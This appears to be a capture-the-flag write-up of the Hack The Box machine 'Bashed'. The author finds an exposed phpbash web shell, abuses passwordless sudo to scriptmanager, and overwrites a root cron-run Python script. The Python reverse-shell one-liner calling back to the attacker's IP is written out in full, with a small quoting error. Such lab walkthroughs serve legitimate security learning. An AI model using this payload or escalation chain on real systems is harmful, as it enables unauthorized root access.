Next up: Bashed.

Starting with `nmap -A -T4 -Pn 10.10.10.68`:

<img src="/assets/images/htb-bashed/nmap.png">

Apache 2.4.18 running through port 80. System is running Ubuntu. Let's go check out the website:

<img src="/assets/images/htb-bashed/landing.png">

So phpbash is a pretty PHP web shell. The author mentions that he developed on *this server*. There's a link in the URL bar in the screenshot on their homepage:

<img src="/assets/images/htb-bashed/url.png">

Sadly, visiting it throws a 404. But it's probably somewhere on the server. Dirbuster time. While that ran, I looked for potential Apache 2.4.18 exploits, but didn't find anything useful for a remote attack. Here are the dirbuster results:

<img src="/assets/images/htb-bashed/dirbuster.png">

<img src="/assets/images/htb-bashed/dev.png">

There's the `phpbash.php` file. Let's try visiting it:

<img src="/assets/images/htb-bashed/phpbash.png">

We're in, as www-data. Let's try visiting `/`:

<img src="/assets/images/htb-bashed/basedir.png">

Theres a /scripts folder which shouldn't exist by default.

Also, in the home folder, there are 2 users:

<img src="/assets/images/htb-bashed/homeusers.png">

Looks like we have to be scriptmanager to access the scripts folder:

<img src="/assets/images/htb-bashed/permissions.png">

Let's try `sudo -l`:

<img src="/assets/images/htb-bashed/sudol.png">

Ok, so as www-data we can run anything as scriptmanager without a password. Can we maybe get a shell as the scriptmanager user?

Let's look at the scripts folder as scriptmanager: `sudo -u scriptmanager chmod 777 scripts`

<img src="/assets/images/htb-bashed/scripts.png">

 `test.py` is writing "testing 123!" into `test.txt`:

<img src="/assets/images/htb-bashed/testpy.png">

<img src="/assets/images/htb-bashed/testtxt.png">

On closer analysis, we see that `test.txt` doesn't have the same timestamp as the folder and `test.py`. It actually has the current time.

I used `watch -n1 -x ls -la` to run `ls -la` every second to see how often `test.txt` was being written to. It changed in a minute:

<img src="/assets/images/htb-bashed/cron.png">

So `test.py` keeps executing. Can we put the code to get a reverse shell into it? We can't use nano because this shell isn't tty, but we can make a file on our attacking machine and `wget` the file from the web shell:

On our machine: 

`echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.95,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > test.py` (my IP is 10.10.16.95 and I used port 4444)

and `sudo python -m SimpleHTTPServer 80` in the same directory. Also, open a listener on port 4444 with `nc -nvlp 4444`.

<img src="/assets/images/htb-bashed/wget.png">

After waiting for a few seconds:

<img src="/assets/images/htb-bashed/wait.png">

<img src="/assets/images/htb-bashed/root.png">

<img src="/assets/images/htb-bashed/flags.png">

And we're done. I noticed when submitting my flags that there were a lot more user submissions than root, so I must have used a different approach. Anyway, this was a short fun box. Thanks for reading!
